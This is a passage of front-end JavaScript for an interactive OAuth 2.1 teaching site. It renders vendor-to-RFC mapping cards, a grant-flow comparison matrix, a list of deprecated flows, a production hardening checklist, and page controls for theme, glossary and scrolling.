        <div class="rosetta-profile-name">${escapeHtml(v.profile)}</div>
      </div>

      <div class="rosetta-bridge">
        <span class="bridge-arrow">↓</span>
        <span>${isDialect ? 'TRANSLATES ON WIRE (VENDOR DIALECT)' : 'TRANSLATES ON WIRE TO'}</span>
      </div>

      <div class="rosetta-bottom">
        <div class="rosetta-rfc-box ${isDialect ? 'dialect-warn' : ''}">${escapeHtml(v.rfc)}</div>
        <p class="rosetta-notes">${escapeHtml(v.mechanics)}</p>
        <div class="rosetta-foot">
          <span style="font-family:var(--font-mono);font-size:0.75rem;color:var(--text-dim);white-space:nowrap">${flowObj ? `Flow ${flowObj.num} · ${escapeHtml(flowObj.shortName)}` : ''}</span>
          <button type="button" class="stage-btn" data-jump-flow="${v.flowId}" style="padding:5px 10px;font-size:0.78rem;white-space:nowrap">▶ Open Flow</button>
        </div>
      </div>
    </article>
  `;
}

function initEnterpriseSection() {
  const filtersEl = document.getElementById('vendor-filters');
  const gridEl = document.getElementById('vendor-grid');
  const searchInput = document.getElementById('rosetta-search-input');
  const btnByVendor = document.getElementById('rosetta-view-vendor');
  const btnByRfc = document.getElementById('rosetta-view-rfc');

  const vendors = ['All', ...new Set(VENDOR_MAPPINGS.map(v => v.vendor))];
  let selectedVendor = 'All';
  let searchQuery = '';
  let viewMode = 'vendor'; // 'vendor' | 'rfc'

  function drawGrid() {
    const q = searchQuery.trim().toLowerCase();
    const items = VENDOR_MAPPINGS.filter(v => {
      const matchVendor = selectedVendor === 'All' || v.vendor === selectedVendor;
      const matchSearch =
        !q ||
        v.vendor.toLowerCase().includes(q) ||
        v.profile.toLowerCase().includes(q) ||
        v.rfc.toLowerCase().includes(q) ||
        v.mechanics.toLowerCase().includes(q);
      return matchVendor && matchSearch;
    });

    if (!items.length) {
      gridEl.innerHTML = `<div class="panel-card" style="text-align:center;color:var(--text-muted);margin-bottom:36px">No enterprise wrapper profiles matched "${escapeHtml(searchQuery)}".</div>`;
      return;
    }

    if (viewMode === 'vendor') {
      gridEl.innerHTML = `<div class="rosetta-grid">${items.map(renderRosettaCard).join('')}</div>`;
    } else {
      const grouped = {};
      items.forEach(it => {
        const b = rfcBucketOf(it);
        if (!grouped[b]) grouped[b] = [];
        grouped[b].push(it);
      });
      gridEl.innerHTML = Object.entries(grouped)
        .map(
          ([bucket, list]) => `
          <div class="rosetta-group-block">
            <div class="rosetta-group-head">
              <h4><span class="badge rfc">${list.length} wrapper${list.length > 1 ? 's' : ''}</span> ${escapeHtml(bucket)}</h4>
            </div>
            <div class="rosetta-grid" style="margin-bottom:10px">${list.map(renderRosettaCard).join('')}</div>
          </div>`
        )
        .join('');
    }

    gridEl.querySelectorAll('[data-jump-flow]').forEach(btn => {
      btn.addEventListener('click', () => scrollToFlow(btn.dataset.jumpFlow));
    });
  }

  filtersEl.innerHTML = vendors
    .map(v => {
      const count = v === 'All' ? VENDOR_MAPPINGS.length : VENDOR_MAPPINGS.filter(x => x.vendor === v).length;
      const dot = v === 'All' ? '' : `<i class="v-dot" style="background:${VENDOR_META[v]?.color || '#38bdf8'}"></i>`;
      return `<button type="button" class="filter-pill ${v === 'All' ? 'active' : ''}" data-vendor="${escapeHtml(v)}">${dot}<span>${escapeHtml(v)}</span> <span style="opacity:0.75;font-family:var(--font-mono);font-size:0.75rem">(${count})</span></button>`;
    })
    .join('');

  filtersEl.querySelectorAll('[data-vendor]').forEach(btn => {
    btn.addEventListener('click', () => {
      selectedVendor = btn.dataset.vendor;
      filtersEl.querySelectorAll('[data-vendor]').forEach(b => b.classList.toggle('active', b === btn));
      drawGrid();
    });
  });

  if (searchInput) {
    searchInput.addEventListener('input', e => {
      searchQuery = e.target.value;
      drawGrid();
    });
  }

  if (btnByVendor && btnByRfc) {
    btnByVendor.addEventListener('click', () => {
      viewMode = 'vendor';
      btnByVendor.classList.add('active');
      btnByRfc.classList.remove('active');
      drawGrid();
    });
    btnByRfc.addEventListener('click', () => {
      viewMode = 'rfc';
      btnByRfc.classList.add('active');
      btnByVendor.classList.remove('active');
      drawGrid();
    });
  }

  drawGrid();

  // Deep-Dive Animated Multi-Hop Tabs
  const tabsEl = document.getElementById('deepdive-tabs');
  const contentEl = document.getElementById('deepdive-content');
  let activeDD = ENTERPRISE_DEEPDIVES[0].id;

  function drawDeepDive() {
    if (activeEnterpriseTheatre) activeEnterpriseTheatre.destroy();
    const dd = ENTERPRISE_DEEPDIVES.find(d => d.id === activeDD) || ENTERPRISE_DEEPDIVES[0];

    contentEl.innerHTML = `
      <div class="panel-card" style="margin-bottom:18px">
        <h4 style="font-family:var(--font-display);font-size:1.25rem;font-weight:800;margin-bottom:8px">${escapeHtml(dd.title)}</h4>
        <p style="font-size:0.92rem;color:var(--text-secondary)">${escapeHtml(dd.problem)}</p>
      </div>
      <div id="dd-theatre-mount" style="margin-bottom:18px"></div>
      <div class="panel-card">
        <h4 class="panel-title">🔍 Enterprise Production Gotchas</h4>
        <div class="pitfall-grid-v2">
          ${dd.gotchas
            .map(
              (g, gi) => `
            <article class="pitfall-card-v2">
              <div class="pitfall-kicker"><span>GOTCHA 0${gi + 1}</span><span>ENTERPRISE</span></div>
              <p>${escapeHtml(g)}</p>
            </article>`
            )
            .join('')}
        </div>
      </div>
    `;

    activeEnterpriseTheatre = createProtocolTheatre({
      container: contentEl.querySelector('#dd-theatre-mount'),
      config: dd,
      getLens: () => currentLens,
      getAnimStyle: () => currentAnimStyle,
      onCopy: copyText
    });
  }

  tabsEl.innerHTML = ENTERPRISE_DEEPDIVES.map(
    (d, i) => `
    <button type="button" class="deepdive-tab ${i === 0 ? 'active' : ''}" data-dd="${d.id}">
      ${escapeHtml(d.title)}
      <small>${escapeHtml(d.subtitle)}</small>
    </button>`
  ).join('');

  tabsEl.querySelectorAll('[data-dd]').forEach(btn => {
    btn.addEventListener('click', () => {
      activeDD = btn.dataset.dd;
      tabsEl.querySelectorAll('[data-dd]').forEach(b => b.classList.toggle('active', b === btn));
      drawDeepDive();
    });
  });

  drawDeepDive();
}

// ==========================================================================
// 5. SYNTHESIS: MATRIX, OAUTH 2.1, DEPRECATED GRAVEYARD & AUDIT CHECKLIST
// ==========================================================================
function initSynthesisSection() {
  // Decision Wizard
  mountDecisionWizard({
    wizardEl: document.getElementById('decision-wizard-box'),
    mapEl: document.getElementById('decision-svg-map'),
    onJumpToFlow: id => scrollToFlow(id)
  });

  // Master Comparison Matrix with Filter
  const matrixBody = document.getElementById('matrix-tbody');
  const matrixFilters = document.getElementById('matrix-filters');
  let mFilter = 'all';

  function drawMatrix() {
    const rows = FLOWS.filter(f => {
      if (mFilter === 'core') return f.groupTag === 'core';
      if (mFilter === 'ext') return f.groupTag === 'ext';
      if (mFilter === 'public') return f.clientType.toLowerCase().includes('public');
      if (mFilter === 'confidential') return f.clientType.toLowerCase().includes('confidential only');
      return true;
    });

    matrixBody.innerHTML = rows
      .map(
        f => `
      <tr data-row-flow="${f.id}">
        <td><strong style="color:var(--text-primary)">${f.num}. ${escapeHtml(f.shortName)}</strong><br><code style="font-size:0.78rem">${escapeHtml(f.grantType)}</code></td>
        <td><span style="font-family:var(--font-mono);font-size:0.76rem;color:var(--accent-primary)">${escapeHtml(f.rfc)}</span></td>
        <td>${escapeHtml(f.userPresence)}</td>
        <td>${escapeHtml(f.clientType)}</td>
        <td>${escapeHtml(f.tokensIssued)}</td>
        <td>${escapeHtml(f.primaryUse)}</td>
      </tr>`
      )
      .join('');

    matrixBody.querySelectorAll('[data-row-flow]').forEach(tr => {
      tr.addEventListener('click', () => scrollToFlow(tr.dataset.rowFlow));
    });
  }

  matrixFilters.querySelectorAll('[data-mfilter]').forEach(btn => {
    btn.addEventListener('click', () => {
      mFilter = btn.dataset.mfilter;
      matrixFilters.querySelectorAll('[data-mfilter]').forEach(b => b.classList.toggle('active', b === btn));
      drawMatrix();
    });
  });
  drawMatrix();

  // OAuth 2.1 Rules
  document.getElementById('oauth21-rules').innerHTML = OAUTH_21_RULES.map(
    r => `
    <li>
      <span class="rule-num">${r.num}</span>
      <div><strong style="display:block;color:var(--text-primary);margin-bottom:2px">${escapeHtml(r.title)}</strong><span style="color:var(--text-secondary)">${escapeHtml(r.desc)}</span></div>
    </li>`
  ).join('');

  // Deprecated Graveyard
  const graveEl = document.getElementById('deprecated-graveyard');
  graveEl.innerHTML = DEPRECATED_FLOWS.map(
    d => `
    <div class="graveyard-card">
      <span class="graveyard-stamp">BANNED IN OAUTH 2.1</span>
      <h4 style="font-family:var(--font-display);font-size:1.05rem;font-weight:800;margin-bottom:6px">${escapeHtml(d.name)}</h4>
      <div style="font-family:var(--font-mono);font-size:0.76rem;color:#fb7185;margin-bottom:10px">${escapeHtml(d.wire)}</div>
      <ul style="padding-left:18px;font-size:0.84rem;color:var(--text-secondary);display:grid;gap:6px;margin-bottom:12px">
        ${d.reasons.map(r => `<li>${escapeHtml(r)}</li>`).join('')}
      </ul>
      <div style="font-size:0.84rem;color:var(--ch-back);font-weight:600;margin-bottom:10px">✅ Use Instead: ${escapeHtml(d.replacement)}</div>
      <button type="button" class="stage-btn" data-rep-flow="${d.replacementFlowId}">Inspect Replacement Flow →</button>
    </div>`
  ).join('');

  graveEl.querySelectorAll('[data-rep-flow]').forEach(b => {
    b.addEventListener('click', () => scrollToFlow(b.dataset.repFlow));
  });

  // Interactive Production Hardening Audit Checklist
  const STORAGE_KEY = 'oauth-atlas-checklist-v1';
  let checkedSet = new Set();
  try {
    const saved = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
    if (Array.isArray(saved)) checkedSet = new Set(saved);
  } catch {}

  const domainsEl = document.getElementById('checklist-domains');
  const ringCircle = document.getElementById('readiness-ring-circle');
  const ringPct = document.getElementById('readiness-pct');
  const ringSummary = document.getElementById('readiness-summary');
  const allItems = HARDENING_CHECKLIST.flatMap(d => d.items);
  const CIRCUMFERENCE = 2 * Math.PI * 32;

  function updateReadiness() {
    const done = checkedSet.size;
    const total = allItems.length;
    const pct = Math.round((done / total) * 100);
    ringPct.textContent = `${pct}%`;
    ringCircle.style.strokeDasharray = `${CIRCUMFERENCE}`;
    ringCircle.style.strokeDashoffset = `${CIRCUMFERENCE * (1 - pct / 100)}`;
    ringCircle.style.stroke = pct === 100 ? '#10b981' : pct >= 50 ? '#38bdf8' : '#f59e0b';
    ringSummary.textContent = `${done} of ${total} production security controls verified`;
    try {
      localStorage.setItem(STORAGE_KEY, JSON.stringify([...checkedSet]));
    } catch {}
  }

  domainsEl.innerHTML = HARDENING_CHECKLIST.map(
    dom => `
    <div class="domain-box">
      <h4>${escapeHtml(dom.domain)}</h4>
      ${dom.items
        .map(
          it => `
        <label class="check-row ${checkedSet.has(it.id) ? 'checked' : ''}" data-cid="${it.id}">
          <input type="checkbox" ${checkedSet.has(it.id) ? 'checked' : ''} />
          <span><strong style="color:var(--text-primary)">${escapeHtml(it.label)}:</strong> ${escapeHtml(it.detail)}</span>
        </label>`
        )
        .join('')}
    </div>`
  ).join('');

  domainsEl.querySelectorAll('.check-row').forEach(row => {
    const cb = row.querySelector('input');
    cb.addEventListener('change', () => {
      const id = row.dataset.cid;
      if (cb.checked) {
        checkedSet.add(id);
        row.classList.add('checked');
        sound.playTone('back');
      } else {
        checkedSet.delete(id);
        row.classList.remove('checked');
      }
      updateReadiness();
    });
  });

  document.getElementById('checklist-export').addEventListener('click', () => {
    const lines = ['# OAuth 2.1 Production Hardening Audit', ''];
    HARDENING_CHECKLIST.forEach(dom => {
      lines.push(`## ${dom.domain}`);
      dom.items.forEach(it => {
        lines.push(`- [${checkedSet.has(it.id) ? 'x' : ' '}] **${it.label}:** ${it.detail}`);
      });
      lines.push('');
    });
    copyText(lines.join('\n'), 'Copied Markdown Audit Checklist');
  });

  document.getElementById('checklist-reset').addEventListener('click', () => {
    checkedSet.clear();
    domainsEl.querySelectorAll('.check-row').forEach(r => {
      r.classList.remove('checked');
      r.querySelector('input').checked = false;
    });
    updateReadiness();
    showToast('Checklist cleared');
  });

  updateReadiness();
}

// ==========================================================================
// 6. GLOBAL CONTROLS (LENS, THEME, AUDIO, SCROLL PROGRESS, REVEAL)
// ==========================================================================
function initGlobalControls() {
  // Flow Diagram Perspective Dropdown (#stage-view-select: zones / ledger / pov / sequence)
  const stageViewSelect = document.getElementById('stage-view-select');
  const mobileSectionSelect = document.getElementById('mobile-section-select');

  function animToastLabel(mode) {
    if (mode === 'ledger') return '🗝️ Crypto Ledger: Live actor keyrings & lock checks';
    if (mode === 'pov') return '🖥️ User + Wire POV: Browser screen vs. backend topology';
    if (mode === 'sequence') return '📊 Sequence Ladder: Compact chronological waterfall';
    return '🛡️ Trust Zones: Public surface vs. sealed TLS vault';
  }

  function setAnimStyleMode(nextAnim, toastMsg) {
    currentAnimStyle = nextAnim;
    document.documentElement.setAttribute('data-anim-style', currentAnimStyle);
    if (stageViewSelect) stageViewSelect.value = currentAnimStyle;
    allTheatres.forEach(t => t.setAnimStyle(currentAnimStyle, true));
    if (activeEnterpriseTheatre) activeEnterpriseTheatre.setAnimStyle(currentAnimStyle, true);
    if (toastMsg) showToast(toastMsg);
  }

  if (stageViewSelect) {
    stageViewSelect.addEventListener('change', e => {
      const next = e.target.value;
      setAnimStyleMode(next, animToastLabel(next));
    });
  }

  // Lens Switcher
  function setLensMode(nextLens, toastMsg) {
    currentLens = nextLens;
    document.documentElement.setAttribute('data-lens', currentLens);
    document.querySelectorAll('[data-set-lens]').forEach(b => b.classList.toggle('active', b.dataset.setLens === currentLens));
    allTheatres.forEach(t => t.refreshLens());
    if (activeEnterpriseTheatre) activeEnterpriseTheatre.refreshLens();
    if (toastMsg) showToast(toastMsg);
  }

  document.querySelectorAll('[data-set-lens]').forEach(btn => {
    btn.addEventListener('click', () => {
      const next = btn.dataset.setLens;
      setLensMode(
        next,
        next === 'beginner'
          ? '🌱 Beginner Lens: Mental models & analogies focused'
          : next === 'expert'
          ? '⚡ Architect Lens: Wire HTTP, RFCs & threat models focused'
          : '✨ Dual Lens: Beginner + Architect layers side-by-side'
      );
    });
  });

  // Theme Toggle
  const themeBtn = document.getElementById('theme-toggle');
  themeBtn.addEventListener('click', () => {
    const next = document.documentElement.getAttribute('data-theme') === 'light' ? 'dark' : 'light';
    document.documentElement.setAttribute('data-theme', next);
    themeBtn.textContent = next === 'light' ? '🌙' : '☀️';
    showToast(next === 'light' ? '☀️ Daylight Studio theme' : '🌙 Obsidian Kinetic theme');
  });

  // Audio Cues Toggle (optional if control is present)
  const soundBtn = document.getElementById('sound-toggle');
  if (soundBtn) {
    soundBtn.addEventListener('click', () => {
      const on = sound.toggle();
      soundBtn.textContent = on ? '🔊' : '🔇';
      showToast(on ? '🔊 Tactile protocol audio enabled' : '🔇 Audio muted');
    });
  }

  // Glossary Modal Triggers
  document.getElementById('open-glossary-btn').addEventListener('click', () => openGlossary());
  document.getElementById('close-glossary-btn').addEventListener('click', closeGlossary);
  modalEl.addEventListener('click', e => {
    if (e.target === modalEl) closeGlossary();
  });
  modalInput.addEventListener('input', e => renderGlossaryList(e.target.value));
  document.addEventListener('keydown', e => {
    if ((e.metaKey || e.ctrlKey) && e.key.toLowerCase() === 'k') {
      e.preventDefault();
      openGlossary();
    } else if (e.key === 'Escape' && modalEl.classList.contains('open')) {
      closeGlossary();
    }
  });
  document.querySelectorAll('[data-glossary]').forEach(btn => {
    btn.addEventListener('click', () => openGlossary(btn.dataset.glossary));
  });

  // Chapter 1 roadmap jump buttons
  document.querySelectorAll('#foundation [data-jump-flow]').forEach(btn => {
    btn.addEventListener('click', () => scrollToFlow(btn.dataset.jumpFlow));
  });

  // Scroll Progress + Active Nav Highlight + Journey Rail Tracking
  const progressBar = document.getElementById('scroll-progress');
  const navLinks = Array.from(document.querySelectorAll('.nav-links a'));
  const sections = ['foundation', 'level-1', 'level-2', 'level-3', 'enterprise', 'synthesis'].map(id => document.getElementById(id));

  function updateScrollTrackers() {
    const h = document.documentElement.scrollHeight - window.innerHeight;
    const pct = h > 0 ? (window.scrollY / h) * 100 : 0;
    if (progressBar) progressBar.style.width = `${Math.min(100, Math.max(0, pct))}%`;

    let currentSection = '';
    for (const s of sections) {
      if (s && window.scrollY >= s.offsetTop - 200) currentSection = s.id;
    }
    navLinks.forEach(a => a.classList.toggle('active', a.getAttribute('href') === `#${currentSection}`));
    if (mobileSectionSelect && currentSection) {
      mobileSectionSelect.value = `#${currentSection}`;
    }

    if (journeyStops.length) {
      const markerY = window.scrollY + 240;
      let activeStop = journeyStops[0];
      for (const stop of journeyStops) {
        const el = document.getElementById(stop.targetId);
        if (el) {
          const absTop = el.getBoundingClientRect().top + window.scrollY;
          if (markerY >= absTop) activeStop = stop;
        }
      }
      syncJourneyRailActive(activeStop.targetId);
      if (activeStop.flowId && heroConvergence) heroConvergence.highlight(activeStop.flowId);
    }
  }

  window.addEventListener('scroll', updateScrollTrackers, { passive: true });
  updateScrollTrackers();

  // Bulletproof Scroll Reveal Observer (NEVER leaves hash-jumped sections or subsections hidden!)
  const revealAllVisibleOrAbove = () => {
    document.querySelectorAll('.reveal:not(.visible)').forEach(el => {
      const r = el.getBoundingClientRect();
      if (r.top < window.innerHeight + 300) el.classList.add('visible');
    });
  };
  const revealSectionByHash = hash => {
    if (!hash || hash === '#top') return;
    const target = document.querySelector(hash);
    if (!target) return;
    const section = target.closest('section') || target;
    section.querySelectorAll('.reveal').forEach(el => el.classList.add('visible'));
    if (section.classList.contains('reveal')) section.classList.add('visible');
    revealAllVisibleOrAbove();
  };

  if (mobileSectionSelect) {
    mobileSectionSelect.addEventListener('change', e => {
      const hash = e.target.value;
      revealSectionByHash(hash);
      const target = document.querySelector(hash);
      if (target) target.scrollIntoView({ behavior: 'smooth', block: 'start' });
    });
  }
  const io = new IntersectionObserver(
    entries => {
      entries.forEach(entry => {
        if (entry.isIntersecting) {
          entry.target.classList.add('visible');
          io.unobserve(entry.target);
        }
      });
    },
    { threshold: 0.01, rootMargin: '240px 0px' }
  );
  document.querySelectorAll('.reveal').forEach(el => io.observe(el));
  document.querySelectorAll('a[href^="#"]').forEach(a => {
    a.addEventListener('click', () => revealSectionByHash(a.getAttribute('href')));
  });
  window.addEventListener('hashchange', () => revealSectionByHash(window.location.hash));
  window.addEventListener('scroll', revealAllVisibleOrAbove, { passive: true });
  setTimeout(() => {
    revealSectionByHash(window.location.hash);
    revealAllVisibleOrAbove();
  }, 100);
}

// ==========================================================================
// BOOTSTRAP
// ==========================================================================
document.addEventListener('DOMContentLoaded', () => {
  heroConvergence = mountHeroConvergence({
    mapWrap: document.getElementById('hero-convergence-map'),
    previewWrap: document.getElementById('hero-convergence-preview'),
    onSelectFlow: id => scrollToFlow(id)
  });

  // Render 8 colored mini-station dots inside Hero visual
  const dotsWrap = document.getElementById('hero-line-dots');
  if (dotsWrap) {
    dotsWrap.innerHTML =
      `<span style="font-family:var(--font-mono);font-size:0.75rem;color:var(--text-dim);margin-right:4px">QUICK JUMP:</span>` +
      FLOWS.map(
        (f, i) =>
          `<button type="button" class="hero-line-dot${i === 0 ? ' is-active' : ''}" style="--line-c:${f.accent}" data-hero-flow="${f.id}" title="Flow ${f.num}: ${escapeHtml(f.name)}">${f.num}</button>`
      ).join('');
    dotsWrap.querySelectorAll('[data-hero-flow]').forEach(btn => {
      const flowId = btn.dataset.heroFlow;
      btn.addEventListener('mouseenter', () => {
        if (heroConvergence) heroConvergence.highlight(flowId);
      });
      btn.addEventListener('focus', () => {
        if (heroConvergence) heroConvergence.highlight(flowId);
      });
      btn.addEventListener('click', () => scrollToFlow(flowId));
    });
  }

  initBffLab();
  initProgressiveFlows();
  initJourneyRail();
  initEnterpriseSection();
  initSynthesisSection();
  initGlobalControls();
});
